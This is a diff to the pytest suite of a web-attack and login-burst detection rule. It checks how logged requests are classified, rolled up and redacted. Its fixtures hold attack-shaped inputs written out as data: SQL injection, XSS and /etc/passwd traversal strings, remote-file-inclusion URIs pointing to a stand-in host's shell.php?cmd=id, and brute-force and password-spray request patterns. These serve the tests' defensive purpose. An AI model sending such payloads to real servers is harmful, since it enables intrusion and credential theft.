@@ -156,7 +156,7 @@ def test_registered_login_rule_surfaces_a_failure_burst():
 
 
 def test_both_rules_carry_a_new_version():
-    assert wa.WebAttacks.version == "2" and wa.WebLoginBurst.version == "2"
+    assert wa.WebAttacks.version == "3" and wa.WebLoginBurst.version == "3"
 
 
 ATTACKS = [
@@ -589,11 +589,72 @@ def test_a_token_is_not_a_password_away_from_a_sign_in_path(login_rule):
         other.close_spill()
 
 
+def test_a_client_polling_with_its_own_credentials_is_not_a_burst(login_rule):
+    # a recorder that fetches a camera snapshot every ten seconds, and a gateway that sends with fixed credentials
+    rows = [event("/cgi-bin/snapshot.cgi?user=admin&pwd=1234&channel=1", n=n, at=n * 10, status=200) for n in range(40)]
+    rows += [event(f"/sendsms?username=svc&password=s3cret&to=555{n:04d}", n=100 + n, at=n * 8, status=200,
+                   source="192.0.2.77") for n in range(30)]
+    assert finish(login_rule, rows) == []
+    assert login_rule.capped == 0 and login_rule.evaluated == 70
+
+
+def test_one_recorder_polling_a_hundred_cameras_is_silent(login_rule):
+    rows = [event("/cgi-bin/snapshot.cgi?user=admin&pwd=1234", n=25 * camera + n, at=n * 10, status=200,
+                  source="10.20.1.5", destination=f"10.20.0.{camera + 1}") for camera in range(100) for n in range(25)]
+    assert finish(login_rule, rows) == []
+
+
+def test_guessed_passwords_state_their_distinct_credential_pairs(login_rule):
+    rows = [event(f"/dvwa/vulnerabilities/brute/?username=admin&password=Zq{n}x&Login=Login", n=n, status=200)
+            for n in range(30)]
+    [match] = finish(login_rule, rows)
+    assert match.proposed_lane == "lead"
+    assert "30 recorded requests carrying an account and a password parameter" in match.claim
+    assert "with 30 distinct credential pairs" in match.claim
+    assert "whether any pair was accepted is not" in match.claim
+    assert match.aggregate_summary["total_refs"] == 30 and match.aggregate_summary["distinct_members"] == 30
+    assert "Zq7x" not in str(match) and "Zq7x" not in stored_text(login_rule)
+
+
+def test_a_spray_of_one_password_over_many_accounts_counts_its_pairs(login_rule):
+    rows = [event(f"/portal/home.do?username=user{n}&password=Spring2025", n=n, status=302) for n in range(30)]
+    [match] = finish(login_rule, rows)
+    assert "with 30 distinct credential pairs" in match.claim
+    assert "Spring2025" not in str(match) and "Spring2025" not in stored_text(login_rule)
+
+
+def test_repeats_of_a_pair_do_not_add_pairs_and_two_pairs_are_stated(login_rule):
+    rows = [event(f"/svc/poll?user=dev{n % 2}&pass=fixed{n % 2}", n=n, status=200) for n in range(40)]
+    [match] = finish(login_rule, rows)
+    assert "40 recorded requests" in match.claim and "with 2 distinct credential pairs" in match.claim
+
+
+def test_credential_labels_are_keyed_per_rule_instance(login_rule):
+    other = rule_named("network.web_login_burst")
+    try:
+        assert login_rule._label("pair", "admin", "1234") == login_rule._label("pair", "admin", "1234")
+        assert login_rule._label("pair", "admin", "1234") != other._label("pair", "admin", "1234")
+        assert login_rule._label("pair", "admin", "1234") != login_rule._label("pair", "admin1", "234")
+    finally:
+        other.close_spill()
+    list(login_rule.consume([event(f"/x?user=admin&pwd=p{n}", n=n, status=200) for n in range(25)]))
+    kept = stored_text(login_rule)
+    import hashlib
+    assert hashlib.sha256(b"admin").hexdigest() not in kept       # no unkeyed label of the account either
+
+
+def test_a_sign_in_path_keeps_counting_a_repeated_pair(login_rule):
+    # unchanged: at a sign-in path a credential-bearing GET counts whatever the pair
+    [match] = finish(login_rule, [event("/login?username=alice&password=same", n=n, status=200) for n in range(20)])
+    assert "requests to a sign-in path" in match.claim and "distinct credential pairs" not in match.claim
+
+
 def test_the_login_claim_states_the_response_status_mix(login_rule):
     rows = [event("/login.php", n=n, at=n * 2, method="POST", status=200 if n in (7, 19) else 302) for n in range(30)]
     [match] = finish(login_rule, rows)
     assert match.proposed_lane == "lead"
-    assert "at path /login.php" in match.claim
+    assert "recorded requests to a sign-in path of 10.2.3.4, /login.php, in five minutes" in match.claim
+    assert "that each was a login attempt" in match.claim and "authentication-attempt" not in match.claim
     assert "Of the 30 record(s) in that window, 28 answered 302, 2 answered 200." in match.claim
     assert any("No status is read as a failed or a successful login" in note for note in match.notes)
 
@@ -611,7 +672,7 @@ def test_a_path_parameter_does_not_split_one_sign_in_endpoint(login_rule):
     rows = burst(None, "POST", 200, vary=lambda n: f"/j_security_check;jsessionid=S{n:04d}")
     [match] = finish(login_rule, rows)
     assert match.aggregate_summary["total_refs"] == 30
-    assert "at path /j_security_check " in match.claim and "jsessionid" not in match.claim
+    assert ", /j_security_check, in five minutes" in match.claim and "jsessionid" not in match.claim
 
 
 def test_login_threshold_and_window_boundaries(login_rule):
@@ -652,7 +713,7 @@ def test_login_burst_keeps_secrets_out_of_claims_predicates_and_the_store(login_
                   status=200) for n in range(25)]
     [match] = finish(login_rule, rows)
     assert "TOPSECRET" not in str(match) and "TOPSECRET" not in stored_text(login_rule)
-    assert "at path /portal/login " in match.claim
+    assert ", /portal/login, in five minutes" in match.claim
 
 
 # ---- decoding never hides a request ----------------------------------------------------------------------------------
@@ -790,6 +851,60 @@ def test_a_url_on_the_requested_server_is_not_remote():
     assert classes_of([zeek("/view?page=https://www.example.test/../../etc/passwd")])[0] == {"path_traversal_lfi"}
 
 
+SERVER = "10.9.0.1"      # one of the site's own servers under the default internal ranges
+
+
+@pytest.mark.parametrize("uri", [
+    "/fi/?page=http://evil.example/shell.php", "/fi/?page=http://evil.example/shell.php?cmd=id",
+    "/fi/?page=//evil.example/shell.php", "/fi/?file=https://evil.example/a/b.jsp&x=1",
+    "/fi/?template=http://evil.example/t.aspx", "/fi/?doc=http://evil.example/x.phtml",
+    "/fi/?path=http://evil.example/run.cgi?a=b", "/fi/?page=http://evil.example/shell.php%00",
+    "/fi/?page=http://evil.example/c99.gif?", "/fi/?root=http://evil.example/cmd.pl",
+])
+def test_a_script_url_on_another_domain_sent_to_the_sites_server_is_inclusion(uri):
+    # the fixtures' Host is www.example.test
+    assert classes_of([zeek(uri, destination=SERVER)])[0] == {"remote_file_inclusion"}
+    # and with no recorded Host, or a Host that is an address
+    assert classes_of([event(uri, destination=SERVER)])[0] == {"remote_file_inclusion"}
+    assert classes_of([event(uri, destination=SERVER, extra={"http.hostname": "10.9.0.1"})])[0] == {
+        "remote_file_inclusion"}
+
+
+@pytest.mark.parametrize("uri", [
+    # the same registered domain as the requested host
+    "/proxy?page=https://www.example.test/index.php", "/go?path=https://docs.example.test/guide.aspx",
+    "/render?template=https://cdn.example.test/tpl/main.jsp", "/go?path=//docs.example.test/guide.php",
+    # not a URL, not a file-like parameter
+    "/x?path=//static/app.php", "/x?page=/local/page.php", "/out?url=http://partner.example/landing.php?id=5",
+    "/login?next=https://other.example/home.php", "/cb?redirect_uri=https://app.other.example/callback.php",
+    # other domains with neither a script nor a text extension
+    "/embed?file=https://media.example/video.mp4", "/view?page=https://other.example/guide",
+])
+def test_a_script_url_of_the_site_itself_or_in_a_redirect_is_not_inclusion(uri):
+    assert classes_of([zeek(uri, destination=SERVER)])[0] == set()
+
+
+@pytest.mark.parametrize("uri", [
+    "/collect?page=https://shop.example.test/cart.php", "/b/ss?file=https://shop.example.test/item.aspx&v=1",
+    "/pixel?doc=http://intranet.example.test/home.jsp",
+])
+def test_a_page_url_carried_outward_to_a_third_party_is_not_inclusion(uri):
+    # an internal client reporting the page it is on to an outside collector: cross-domain, but outbound
+    row = event(uri, source="10.2.3.9", destination="203.0.113.50", extra={"http.hostname": "stats.tracker.example"})
+    assert classes_of([row])[0] == set()
+    # the same request arriving at one of the site's servers is the inclusion shape
+    inbound = event(uri, n=1, destination=SERVER, extra={"http.hostname": "stats.tracker.example"})
+    assert classes_of([inbound])[0] == {"remote_file_inclusion"}
+
+
+def test_a_two_label_suffix_is_not_mistaken_for_one_site():
+    uri = "/fi/?page=http://evil.co.uk/shell.php"
+    assert classes_of([event(uri, destination=SERVER, extra={"http.hostname": "www.victim.co.uk"})])[0] == {
+        "remote_file_inclusion"}
+    same = "/fi/?page=http://files.victim.co.uk/help.php"
+    assert classes_of([event(same, n=1, destination=SERVER, extra={"http.hostname": "www.victim.co.uk"})])[0] == set()
+
+
 # ---- fleet and sweep roll-ups ----------------------------------------------------------------------------------------
 
 SQL, XSS, PATH = "/x?id=1'+or+'1'='1", "/s?q=<script>alert(1)</script>", "/../../etc/passwd"
@@ -818,8 +933,8 @@ def test_one_scanner_against_many_servers_is_one_sweep_per_class(attack_rule):
         assert match.aggregate_summary["count_complete"] == 1
         members = [address for address, _event in match.fleet_hosts]
         assert len(members) == len(set(members)) == 500
-        # internal servers are the hunt's own machines: published as hosts, never as outside addresses
-        assert match.fleet_member_kind == "host"
+        # internal servers are published as internal addresses: never as outside ones, never as host names
+        assert match.fleet_member_kind == "internal_address"
         assert "500 distinct internal destination address(es)" in match.claim
         assert "and 490 more" in match.claim
         named = [value for kind, value, role in match.entities if role == "dst"]
@@ -866,7 +981,7 @@ def test_every_pair_is_covered_when_many_scanners_meet_many_servers(attack_rule)
         covered |= {(match.group_key.split("|")[1], address) for address, _event in match.fleet_hosts}
     assert covered == set(pairs)
     assert all(match.fleet_member_kind == "external_address" for match in fleets)
-    assert all(match.fleet_member_kind == "host" for match in sweeps)
+    assert all(match.fleet_member_kind == "internal_address" for match in sweeps)
 
 
 def test_an_internal_source_against_many_outside_servers_is_one_sweep_of_outside_addresses(attack_rule):
@@ -883,10 +998,66 @@ def test_members_on_both_sides_of_the_site_boundary_are_two_roll_ups(attack_rule
     rows += [event(SQL, n=100 + s, source=f"10.9.1.{s + 1}", destination="10.9.0.1") for s in range(20)]
     _live, final = published(attack_rule, rows)
     assert final["fleet|10.9.0.1|sql_injection|out"].fleet_member_kind == "external_address"
-    assert final["fleet|10.9.0.1|sql_injection|in"].fleet_member_kind == "host"
+    assert final["fleet|10.9.0.1|sql_injection|in"].fleet_member_kind == "internal_address"
     assert {address for address, _event in final["fleet|10.9.0.1|sql_injection|in"].fleet_hosts} == {
         f"10.9.1.{s + 1}" for s in range(20)}
     assert len(final) == 2 * (wa.PAIR_LEADS + 1)
+
+
+def test_findings_do_not_depend_on_the_order_records_arrive_in():
+    import random
+
+    def rows_in(order):
+        return [event(SQL, n=n, at=n, source=source, destination=destination) for n, (source, destination) in order]
+
+    pairs = [(f"198.51.100.{s + 1}", f"10.9.0.{d + 1}") for s in range(12) for d in range(12)]
+    pairs += [("198.51.100.200", f"10.9.1.{d + 1}") for d in range(40)]            # one scanner, forty servers
+    pairs += [(f"203.0.113.{s + 1}", "10.9.2.1") for s in range(60)]               # sixty sources, one server
+    timed = list(enumerate(pairs))                                                 # a record's time never changes
+    seen, lives = [], []
+    for trial, batch in enumerate((256, 7, 64, 1000, 1)):
+        order = list(timed)
+        if trial:
+            random.Random(trial).shuffle(order)
+        if trial == 4:
+            order.sort(reverse=True)                                               # newest first
+        rule = rule_named("network.web_attacks")
+        try:
+            live, final = published(rule, rows_in(order), batch)
+            # a secondary roll-up cites records kept once it had more members than keep their own leads
+            seen.append({key: (match.claim, match.fleet_host_count, sorted(match.fleet_hosts),
+                               [] if key.startswith("sweep|") else [item.id for item in match.events])
+                         for key, match in final.items()})
+            lives.append({match.group_key for match in live})
+        finally:
+            rule.close_spill()
+    assert all(result == seen[0] for result in seen[1:])
+    own = sorted(key for key in seen[0] if not key.startswith(("fleet|", "sweep|")))
+    # the pairs with the earliest records keep the leads: the scanner's first five servers, the server's first five
+    assert [key for key in own if key.startswith("198.51.100.200|")] == [
+        f"198.51.100.200|10.9.1.{d + 1}|sql_injection" for d in range(wa.PAIR_LEADS)]
+    assert [key for key in own if key.endswith("|10.9.2.1|sql_injection")] == [
+        f"203.0.113.{s + 1}|10.9.2.1|sql_injection" for s in range(wa.PAIR_LEADS)]
+    # records read in time order publish, as they arrive, exactly what stands at the end
+    assert lives[0] == set(seen[0])
+    # out of order, every final lead of a pair was still published on arrival unless its roll-up had reached the
+    # bound on such leads, and no roll-up published more of them than that bound
+    assert all(set(own) <= live for live in lives[:4])
+    for live in lives:
+        early = [key for key in live if not key.startswith(("fleet|", "sweep|"))]
+        assert len([key for key in early if key.endswith("|10.9.2.1|sql_injection")]) <= wa.LIVE_PAIR_LEADS
+
+
+def test_records_of_one_instant_are_ordered_by_address():
+    rows = [event(SQL, n=s, at=0, source=f"198.51.100.{s + 1}", destination="10.9.0.1") for s in (9, 3, 7, 1, 5, 8, 2, 6, 4, 0)]
+    for order in (rows, rows[::-1], sorted(rows, key=lambda row: row.id)):
+        rule = rule_named("network.web_attacks")
+        try:
+            _live, final = published(rule, order, 3)
+            own = sorted(key for key in final if not key.startswith("fleet|"))
+            assert own == sorted(f"198.51.100.{s}|10.9.0.1|sql_injection" for s in (1, 10, 2, 3, 4))
+        finally:
+            rule.close_spill()
 
 
 def test_roll_ups_do_not_depend_on_batch_boundaries():
@@ -930,6 +1101,9 @@ CREDENTIAL_KEYS = [
     "X-Amz-Security-Token", "jwt", "session", "sessionid", "sid", "PHPSESSID", "JSESSIONID", "auth_token",
     "oauth_token", "csrf_token", "user_token", "apiKey", "apikey", "x-api-key", "client-secret", "private_key",
     "otp", "pin", "bearer", "credential", "secret_key", "id_token", "Authorization", "clientSecret", "privatekey",
+    "pAsSwOrD", "PaSsWoRd", "pass_word", "pass-word", "passw", "userpass", "user_pass", "upass", "secretkey",
+    "xapikey", "csrf", "_csrf", "xsrf", "csrfmiddlewaretoken", "cookie", "ticket", "SAMLResponse", "SAMLRequest",
+    "assertion", "oauth_verifier", "__RequestVerificationToken", "ASP.NET_SessionId", "data[User][password]",
 ]
 
 
@@ -943,7 +1117,8 @@ def test_a_parameter_with_a_credential_word_as_a_part_loses_its_value(attack_rul
 
 
 @pytest.mark.parametrize("key", ["monkey", "author", "passenger", "keyboard", "design", "assess", "tokenizer",
-                                 "pinned", "decode", "sidebar"])
+                                 "pinned", "decode", "sidebar", "compass", "bypass", "cookbook", "sticker", "samples",
+                                 "passport", "user_id", "page"])
 def test_a_credential_word_inside_another_word_is_not_a_credential(attack_rule, key):
     [match] = finish(attack_rule, [event(f"/app/../../../etc/passwd?{key}=VISIBLE&x=1")])
     assert any("VISIBLE" in str(predicate.value) for predicate in match.predicate)
@@ -975,6 +1150,18 @@ def test_path_parameters_fragments_and_userinfo_are_masked_on_every_sensor(uri):
             assert "TOPSECRET" not in stored_text(rule), sensor
         finally:
             rule.close_spill()
+
+
+@pytest.mark.parametrize("query,kept", [
+    ("pwd=a?TOPSECRET&x=1", "pwd=[redacted]&x=1"), ("pwd=a#TOPSECRET&x=1", "pwd=[redacted]&x=1"),
+    ("pwd=a;TOPSECRET&x=1", "pwd=[redacted]&x=1"), ("x=1&token=a?b=TOPSECRET", "x=1&token=[redacted]"),
+    ("a=1?password=TOPSECRET&x=1", "a=[redacted]&x=1"), ("a=1#access_token=TOPSECRET", "a=[redacted]"),
+])
+def test_a_credential_value_runs_to_the_end_of_its_parameter(attack_rule, query, kept):
+    [match] = finish(attack_rule, [event("/app/../../../etc/passwd?" + query)])
+    assert "TOPSECRET" not in str(match) and "TOPSECRET" not in stored_text(attack_rule)
+    [value] = [predicate.value for predicate in match.predicate if predicate.field == "url.original"]
+    assert value == "/app/../../../etc/passwd?" + kept
 
 
 def test_the_masking_note_states_what_is_masked(attack_rule):
